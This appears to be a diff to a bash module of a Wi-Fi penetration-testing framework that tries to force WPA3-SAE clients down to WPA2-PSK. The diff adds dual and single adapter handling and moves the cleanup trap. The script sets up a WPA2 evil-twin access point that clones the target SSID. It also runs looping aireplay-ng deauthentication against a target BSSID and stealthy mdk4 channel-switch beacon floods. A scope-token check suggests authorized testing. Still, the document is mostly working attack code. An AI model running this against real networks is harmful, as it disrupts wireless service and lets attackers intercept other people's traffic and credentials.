@@ -6,7 +6,7 @@
 # CRITICAL="no"
 # TOOLS="hostapd,mdk4,aireplay-ng"
 # DESC="Attempt to force WPA3-SAE clients to downgrade to WPA2-PSK"
-# REQS="monitor_iface,target_ssid,nat"
+# REQS="managed_iface,target_ssid,nat"
 # PCAP="yes"
 # TIMED="yes"
 # PROMPTS="roaming_catalyst"
@@ -27,7 +27,6 @@ set -euo pipefail
 # Inputs from Environment
 
 CATALYST="${CATALYST:-1}"
-INTERFACE="${MONITOR_INTERFACE:-}"
 SSID="${GUEST_SSID:-}"
 TARGET_BSSID="${GUEST_BSSID:-}"
 CHANNEL="${GUEST_CHANNEL:-11}" # Default to 11 if not set
@@ -36,6 +35,15 @@ SESSION_DIR="${SESSION_DIR:-.}"
 EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
 ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
 TC_ID="D7"
+
+# Dual/single adapter setup — hostapd requires a managed-mode interface.
+_AP_IFACE="${AP_INTERFACE:-}"
+_RAW_IFACE="${WIFI_INTERFACE:-${MONITOR_INTERFACE:-}}"
+if [[ "$_RAW_IFACE" == *mon ]]; then
+    _PHYS_IFACE="${_RAW_IFACE%mon}"
+else
+    _PHYS_IFACE="$_RAW_IFACE"
+fi
 # --- Scope Guardrail ---
 # Verify this module was launched by the wifi-astra controller.
 # Prevents casual direct invocation against unauthorized targets.
@@ -55,10 +63,48 @@ if [[ -z "${ASTRA_SCOPE_TOKEN:-}" && "${ASTRA_HEADLESS:-}" != "true" ]]; then
 fi
 # --- End Scope Guardrail ---
 
-if [[ -z "$INTERFACE" || -z "$SSID" ]]; then
-    echo "[!] MONITOR_INTERFACE or GUEST_SSID not set."
+if [[ -z "$SSID" ]]; then
+    echo "[!] GUEST_SSID not set."
     exit 1
 fi
+
+# Register cleanup trap BEFORE adapter manipulation so interface is always restored.
+cleanup() {
+    echo "[*] Cleaning up Downgrade processes..."
+    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
+    [[ -n "${CATALYST_PID:-}" ]] && kill "$CATALYST_PID" 2>/dev/null || true
+    [[ -n "${TELEMETRY_PID:-}" ]] && kill "$TELEMETRY_PID" 2>/dev/null || true
+    if [[ -z "${_AP_IFACE:-}" && -n "${_PHYS_IFACE:-}" ]]; then
+        airmon-ng start "$_PHYS_IFACE" > /dev/null 2>&1 || {
+            ip link set "$_PHYS_IFACE" down 2>/dev/null || true
+            iw dev "$_PHYS_IFACE" set type monitor 2>/dev/null || true
+            ip link set "$_PHYS_IFACE" up 2>/dev/null || true
+        }
+    fi
+}
+trap cleanup EXIT
+
+# Determine hostapd interface (must be managed mode).
+if [[ -n "$_AP_IFACE" ]]; then
+    # Dual-adapter mode: AP card stays managed; MONITOR_INTERFACE available for catalyst.
+    HOSTAPD_IFACE="$_AP_IFACE"
+else
+    # Single-adapter degraded mode: toggle physical card to managed.
+    if [[ -z "$_PHYS_IFACE" ]]; then
+        echo "[!] Cannot derive physical interface. Set AP_INTERFACE or ensure WIFI_INTERFACE is set."
+        exit 1
+    fi
+    echo "[*] Restoring ${_PHYS_IFACE} to managed mode for Evil Twin operation..."
+    airmon-ng stop "${MONITOR_INTERFACE:-}" > /dev/null 2>&1 || true
+    ip link set "$_PHYS_IFACE" down 2>/dev/null || true
+    iw dev "$_PHYS_IFACE" set type managed 2>/dev/null || true
+    ip link set "$_PHYS_IFACE" up 2>/dev/null || true
+    sleep 1
+    HOSTAPD_IFACE="$_PHYS_IFACE"
+fi
+
+# Injection interface for deauth/CSA catalyst (only usable in dual-adapter mode).
+MON_IFACE="${MONITOR_INTERFACE:-}"
 
 echo "[*] Initializing WPA3 Downgrade tactical options..."
 
@@ -69,12 +115,12 @@ echo "    2) CSA (Channel Switch Announcement via mdk4 - Stealthier)"
 catalyst_choice="${CATALYST:-1}"
 
 # 2. Deploy WPA2-only Evil Twin
-echo "[*] Deploying WPA2-PSK Evil Twin for SSID: $SSID..."
+echo "[*] Deploying WPA2-PSK Evil Twin for SSID: $SSID on ${HOSTAPD_IFACE}..."
 HOSTAPD_CONF="${EVIDENCE_DIR}/${TC_ID}_hostapd.conf"
 HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"
 
 cat <<EOF > "$HOSTAPD_CONF"
-interface=$INTERFACE
+interface=$HOSTAPD_IFACE
 driver=nl80211
 ssid=$SSID
 hw_mode=g
@@ -86,14 +132,6 @@ wpa_pairwise=TKIP CCMP
 rsn_pairwise=CCMP
 wpa_passphrase=DowngradeTest123
 EOF
-
-cleanup() {
-    echo "[*] Cleaning up Downgrade processes..."
-    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
-    [[ -n "${CATALYST_PID:-}" ]] && kill "$CATALYST_PID" 2>/dev/null || true
-    [[ -n "${TELEMETRY_PID:-}" ]] && kill "$TELEMETRY_PID" 2>/dev/null || true
-}
-trap cleanup EXIT
 
 # 3. Start dynamic telemetry heartbeat
 (
@@ -115,15 +153,22 @@ trap cleanup EXIT
 TELEMETRY_PID=$!
 
 # 4. Execution of Catalyst and hostapd
+# Injection for deauth/CSA requires a monitor-mode interface.
+# In single-adapter degraded mode the card is now in managed mode — skip catalyst.
+if [[ -z "$_AP_IFACE" && "$catalyst_choice" != "0" ]]; then
+    echo "[!] Catalyst skipped — monitor interface unavailable in single-adapter degraded mode."
+    echo "    Connect a second adapter and assign it as the AP adapter for simultaneous injection."
+fi
+
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
     # Window Mode: Run hostapd in foreground, catalyst in background
-    if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
+    if [[ -n "$_AP_IFACE" && "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" && -n "$MON_IFACE" ]]; then
         echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
-        ( while true; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true; sleep 15; done ) &
+        ( while true; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_IFACE" || true; sleep 15; done ) &
         CATALYST_PID=$!
-    elif [[ "$catalyst_choice" == "2" ]] && command -v mdk4 &>/dev/null; then
+    elif [[ -n "$_AP_IFACE" && "$catalyst_choice" == "2" ]] && [[ -n "$MON_IFACE" ]] && command -v mdk4 &>/dev/null; then
         echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
-        timeout --foreground "$SCAN_TIME" mdk4 "$INTERFACE" b -n "$SSID" -c 11 &
+        timeout --foreground "$SCAN_TIME" mdk4 "$MON_IFACE" b -n "$SSID" -c 11 &
         CATALYST_PID=$!
     fi
 
@@ -134,13 +179,13 @@ else
     hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
     HOSTAPD_PID=$!
 
-    if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
+    if [[ -n "$_AP_IFACE" && "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" && -n "$MON_IFACE" ]]; then
         echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
-        ( while kill -0 $HOSTAPD_PID 2>/dev/null; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true; sleep 15; done ) &
+        ( while kill -0 "$HOSTAPD_PID" 2>/dev/null; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_IFACE" > /dev/null 2>&1 || true; sleep 15; done ) &
         CATALYST_PID=$!
-    elif [[ "$catalyst_choice" == "2" ]] && command -v mdk4 &>/dev/null; then
+    elif [[ -n "$_AP_IFACE" && "$catalyst_choice" == "2" ]] && [[ -n "$MON_IFACE" ]] && command -v mdk4 &>/dev/null; then
         echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
-        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
+        mdk4 "$MON_IFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
         CATALYST_PID=$!
     fi
 
